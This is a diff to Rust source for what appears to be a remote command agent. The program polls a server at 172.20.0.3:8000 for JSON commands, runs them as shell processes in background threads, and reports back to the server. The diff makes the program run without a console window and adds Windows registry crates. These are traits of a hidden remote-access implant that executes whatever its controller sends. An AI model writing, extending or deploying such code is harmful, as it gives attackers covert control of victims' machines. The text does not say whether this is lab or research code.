@@ -1,4 +1,9 @@
-//#![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
+
+extern crate reqwest;
+extern crate serde_json;
+extern crate windows;
+extern crate winreg;
 
 mod commands;
 mod node;
@@ -221,10 +226,6 @@ async fn command(command_json: String, uuid: String) {
     for command in json {
         println!("{:?}", command);
 
-        if command["repeat_at"] != serde_json::json!(null) {
-            return;
-        }
-
         let command_type = command["command_type"].as_str().unwrap().to_string();
 
         if command_type == "shell" {
@@ -237,25 +238,29 @@ async fn command(command_json: String, uuid: String) {
 
             let program: String = args[0].to_string();
 
-            // signal command has been run (really received)
-            let signal = client
-                .get("http://172.20.0.3:8000/api/signal")
-                .header("uuid", uuid)
-                .query(&[("command-id", command["id"].as_u64().unwrap())])
-                .send()
-                .await;
-
-            if let Err(e) = signal {
-                println!("Error: {}", e);
-                abort();
-            }
-
             // run command with args
-            match Command::new(program.as_str()).args(&args[1..]).spawn() {
-                Ok(mut child) => {
-                    child.wait().unwrap();
+            thread::spawn(
+                move || match Command::new(program.as_str()).args(&args[1..]).spawn() {
+                    Ok(mut child) => {
+                        child.wait().unwrap();
+                    }
+                    Err(e) => println!("Error: {}", e),
+                },
+            );
+
+            if command["repeat_at"] == serde_json::json!(null) {
+                // signal command has been run (really received)
+                let signal = client
+                    .get("http://172.20.0.3:8000/api/signal")
+                    .header("uuid", uuid.to_owned())
+                    .query(&[("command-id", command["id"].as_u64().unwrap())])
+                    .send()
+                    .await;
+
+                if let Err(e) = signal {
+                    println!("Error: {}", e);
+                    abort();
                 }
-                Err(e) => println!("Error: {}", e),
             }
 
             return;
